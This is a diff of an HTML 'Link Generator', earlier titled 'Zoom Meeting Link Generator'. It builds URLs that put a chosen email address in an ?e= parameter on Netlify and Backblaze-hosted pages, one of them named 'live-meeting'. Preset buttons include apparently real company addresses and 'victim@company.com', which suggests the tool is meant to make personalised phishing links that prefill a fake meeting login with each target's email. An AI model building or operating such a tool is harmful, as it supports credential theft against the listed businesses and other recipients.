@@ -1,138 +1,507 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Zoom Meeting Link Generator</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Generator</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #333;
-            margin-bottom: 30px;
-        }
-        .input-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: bold;
-            color: #555;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
+        * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
         }
-        button {
-            background: #6264a7;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #0b1e3a 0%, #1a3a5c 50%, #2a5a7a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 750px;
+            width: 100%;
+            background: white;
+            padding: 40px 35px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-size: 24px;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+            outline: none;
+            background: #f8f9fa;
+        }
+        .input-group input:focus {
+            border-color: #0b5cff;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0b5cff;
             color: white;
             border: none;
-            padding: 12px 30px;
-            border-radius: 5px;
+            border-radius: 8px;
             font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #0a4ad0;
+        }
+        .btn-copy {
+            background: #28a745;
+            padding: 8px 16px;
+            font-size: 13px;
+            width: auto;
+            margin-top: 0;
+            border: none;
+            border-radius: 6px;
+            color: white;
             cursor: pointer;
         }
-        button:hover {
-            background: #525497;
+        .btn-copy:hover {
+            background: #218838;
         }
-        .result {
-            margin-top: 30px;
-            padding: 20px;
-            background: #f9f9f9;
-            border-radius: 5px;
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
             display: none;
         }
-        .result.show {
+        .result-box.show {
             display: block;
         }
-        .link-box {
+        .result-item {
+            margin-bottom: 12px;
+            padding: 12px;
             background: white;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            word-break: break-all;
-            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 1px solid #e0e0e0;
         }
-        .copy-btn {
-            background: #4CAF50;
+        .result-item .label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 5px;
+        }
+        .result-item .link {
+            font-size: 13px;
+            color: #0b5cff;
+            word-break: break-all;
+            background: #f1f3f5;
+            padding: 8px 10px;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        .result-item .row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 5px;
+            flex-wrap: wrap;
+        }
+        .result-item .row .link {
+            flex: 1;
+            min-width: 200px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 5px;
+            background: #0b5cff;
+        }
+        .badge-custom {
+            background: #6f42c1;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        .custom-link-section {
+            margin-top: 15px;
+            padding: 15px;
+            background: #f1f3f5;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+        }
+        .custom-link-section h4 {
+            font-size: 14px;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+        }
+        .custom-link-item {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .custom-link-item input {
+            flex: 1;
+            min-width: 250px;
+            padding: 8px 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 13px;
+            background: white;
+        }
+        .quick-emails {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
             margin-top: 10px;
+        }
+        .quick-emails button {
+            padding: 5px 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+        .quick-emails button:hover {
+            background: #0b5cff;
+            color: white;
+            border-color: #0b5cff;
+        }
+        .platform-select {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        .platform-select button {
+            padding: 8px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.3s;
+            flex: 1;
+            min-width: 100px;
+        }
+        .platform-select button.active {
+            border-color: #0b5cff;
+            background: #e8eeff;
+            color: #0b5cff;
+            font-weight: 600;
+        }
+        .platform-select button:hover {
+            border-color: #0b5cff;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .stats .stat-box {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .stats .stat-box .number {
+            font-size: 20px;
+            font-weight: 700;
+            color: #0b5cff;
+        }
+        .stats .stat-box .label {
+            font-size: 11px;
+            color: #666;
+            margin-top: 2px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔗 Zoom Meeting Link Generator</h1>
-        
-        <div class="input-group">
-            <label>Your Netlify Domain:</label>
-            <input type="text" id="domain" placeholder="e.g., https://pedidoorder.netlify.app" value="https://pedidoorder.netlify.app">
-        </div>
-        
-        <div class="input-group">
-            <label>Email to Auto-Fill:</label>
-            <input type="email" id="email" placeholder="e.g., person@example.com">
-        </div>
-        
-        <button onclick="generateLink()">Generate Link</button>
-        
-        <div id="result" class="result">
-            <h3>Generated Links:</h3>
-            
-            <h4>Base64 Encoded (Recommended):</h4>
-            <div class="link-box" id="base64Link"></div>
-            <button class="copy-btn" onclick="copyToClipboard('base64Link')">Copy Base64 Link</button>
-            
-            <h4>Plain Text:</h4>
-            <div class="link-box" id="plainLink"></div>
-            <button class="copy-btn" onclick="copyToClipboard('plainLink')">Copy Plain Link</button>
+
+<div class="container">
+    <h1>🔗 Link Generator</h1>
+    <p class="subtitle">Generate custom links with email parameter</p>
+
+    <!-- Email Input -->
+    <div class="input-group">
+        <label>📧 Enter Email Address</label>
+        <input type="email" id="emailInput" placeholder="info@cemet.com.tr" value="info@cemet.com.tr">
+    </div>
+
+    <!-- Quick Email Examples -->
+    <div class="quick-emails">
+        <button onclick="setEmail('info@cemet.com.tr')">info@cemet.com.tr</button>
+        <button onclick="setEmail('sales@containerparts.nl')">sales@containerparts.nl</button>
+        <button onclick="setEmail('test@example.com')">test@example.com</button>
+        <button onclick="setEmail('victim@company.com')">victim@company.com</button>
+        <button onclick="setEmail('user@gmail.com')">user@gmail.com</button>
+    </div>
+
+    <!-- Platform Selection -->
+    <div class="platform-select" style="margin-top: 15px;">
+        <button class="active" onclick="selectPlatform('netlify', this)">🌐 Netlify</button>
+        <button onclick="selectPlatform('backblaze', this)">☁️ Backblaze</button>
+        <button onclick="selectPlatform('custom', this)">🔧 Custom</button>
+    </div>
+
+    <!-- Custom Link Input -->
+    <div class="custom-link-section" id="customLinkSection" style="display:none;">
+        <h4>🔗 Custom Base URL</h4>
+        <div class="custom-link-item">
+            <input type="text" id="customBaseUrl" placeholder="https://your-domain.com/page.html" value="https://beautiful-hummingbird-042b7c.netlify.app/">
         </div>
     </div>
 
-    <script>
-        function generateLink() {
-            const domain = document.getElementById('domain').value;
-            const email = document.getElementById('email').value;
-            
-            if (!email) {
-                alert('Please enter an email!');
-                return;
-            }
-            
-            const encodedEmail = btoa(email);
-            
-            const base64Link = `${domain}/?e=${encodedEmail}`;
-            const plainLink = `${domain}/?e=${email}`;
-            
-            document.getElementById('base64Link').textContent = base64Link;
-            document.getElementById('plainLink').textContent = plainLink;
-            
-            document.getElementById('result').classList.add('show');
+    <button class="btn" onclick="generateLink()">🚀 Generate Link</button>
+
+    <!-- Results -->
+    <div id="resultBox" class="result-box">
+        <div id="resultContent"></div>
+
+        <div class="stats" id="statsContainer">
+            <div class="stat-box">
+                <div class="number" id="statTotal">0</div>
+                <div class="label">Links Generated</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" id="statChar">0</div>
+                <div class="label">Email Length</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Format: <code>?e=email@domain.com</code></p>
+        <p style="margin-top: 5px;">URL-encoded automatically for safe transmission</p>
+    </div>
+</div>
+
+<script>
+// ============================================================
+//  CONFIGURATION
+// ============================================================
+
+const PLATFORMS = {
+    netlify: {
+        name: 'Netlify',
+        url: 'https://beautiful-hummingbird-042b7c.netlify.app/',
+        badge: 'NETLIFY',
+        color: '#0b5cff'
+    },
+    backblaze: {
+        name: 'Backblaze',
+        url: 'https://f004.backblazeb2.com/file/live-meeting/index.html',
+        badge: 'BACKBLAZE',
+        color: '#e67e22'
+    }
+};
+
+let currentPlatform = 'netlify';
+let customBaseUrl = '';
+
+// ============================================================
+//  HELPERS
+// ============================================================
+
+function getEmail() {
+    return document.getElementById('emailInput').value.trim();
+}
+
+function setEmail(email) {
+    document.getElementById('emailInput').value = email;
+    generateLink();
+}
+
+function selectPlatform(platform, btn) {
+    currentPlatform = platform;
+    
+    // Update active button
+    document.querySelectorAll('.platform-select button').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    
+    // Show/hide custom link section
+    const customSection = document.getElementById('customLinkSection');
+    if (platform === 'custom') {
+        customSection.style.display = 'block';
+    } else {
+        customSection.style.display = 'none';
+    }
+    
+    generateLink();
+}
+
+function getBaseUrl() {
+    if (currentPlatform === 'custom') {
+        return document.getElementById('customBaseUrl').value.trim() || 'https://beautiful-hummingbird-042b7c.netlify.app/';
+    }
+    return PLATFORMS[currentPlatform].url;
+}
+
+function generateLink() {
+    const email = getEmail();
+    if (!email || !email.includes('@')) {
+        alert('Please enter a valid email address');
+        return;
+    }
+
+    // URL encode the email
+    const encodedEmail = encodeURIComponent(email);
+    const baseUrl = getBaseUrl();
+    
+    // Build the link
+    const link = baseUrl + (baseUrl.endsWith('/') ? '' : '/') + '?e=' + encodedEmail;
+
+    // Display result
+    displayResult(email, encodedEmail, link);
+
+    // Update stats
+    document.getElementById('statTotal').textContent = '1';
+    document.getElementById('statChar').textContent = email.length;
+}
+
+function displayResult(email, encoded, link) {
+    const container = document.getElementById('resultContent');
+    const resultBox = document.getElementById('resultBox');
+
+    const platformName = currentPlatform === 'custom' ? 'Custom' : PLATFORMS[currentPlatform].name;
+    const badgeClass = currentPlatform === 'custom' ? 'badge-custom' : '';
+
+    container.innerHTML = `
+        <div class="result-item">
+            <span class="badge ${badgeClass}" style="background:${currentPlatform === 'custom' ? '#6f42c1' : PLATFORMS[currentPlatform].color}">${currentPlatform === 'custom' ? 'CUSTOM' : PLATFORMS[currentPlatform].badge}</span>
+            <div class="label">${platformName} Link</div>
+            <div class="row">
+                <div class="link">${link}</div>
+                <button class="btn-copy" onclick="copyLink('${link}')">📋 Copy</button>
+            </div>
+            <div style="font-size: 11px; color: #999; margin-top: 5px;">
+                Email: <strong>${email}</strong> | 
+                Encoded: <code>${encoded}</code>
+            </div>
+        </div>
+    `;
+
+    resultBox.classList.add('show');
+}
+
+function copyLink(url) {
+    navigator.clipboard.writeText(url).then(() => {
+        showToast('✅ Link copied to clipboard!');
+    }).catch(() => {
+        const textarea = document.createElement('textarea');
+        textarea.value = url;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        showToast('✅ Link copied to clipboard!');
+    });
+}
+
+function showToast(message) {
+    const toast = document.createElement('div');
+    toast.textContent = message;
+    toast.style.cssText = `
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #1a1a2e;
+        color: white;
+        padding: 12px 24px;
+        border-radius: 8px;
+        font-size: 14px;
+        z-index: 9999;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        animation: fadeInUp 0.3s ease;
+    `;
+    document.body.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transition = 'opacity 0.3s';
+        setTimeout(() => toast.remove(), 300);
+    }, 2500);
+}
+
+// Auto-generate on load
+document.addEventListener('DOMContentLoaded', function() {
+    generateLink();
+    
+    // Enter key to generate
+    document.getElementById('emailInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            generateLink();
         }
-        
-        function copyToClipboard(elementId) {
-            const linkText = document.getElementById(elementId).textContent;
-            const tempInput = document.createElement('input');
-            tempInput.value = linkText;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempInput);
-            alert('✅ Link copied to clipboard!');
+    });
+    
+    // Custom URL input change
+    document.getElementById('customBaseUrl').addEventListener('input', function() {
+        if (currentPlatform === 'custom') {
+            generateLink();
         }
-    </script>
+    });
+});
+
+// ============================================================
+//  STYLES
+// ============================================================
+
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes fadeInUp {
+        from {
+            opacity: 0;
+            transform: translateX(-50%) translateY(20px);
+        }
+        to {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+    }
+`;
+document.head.appendChild(style);
+</script>
+
 </body>
 </html>
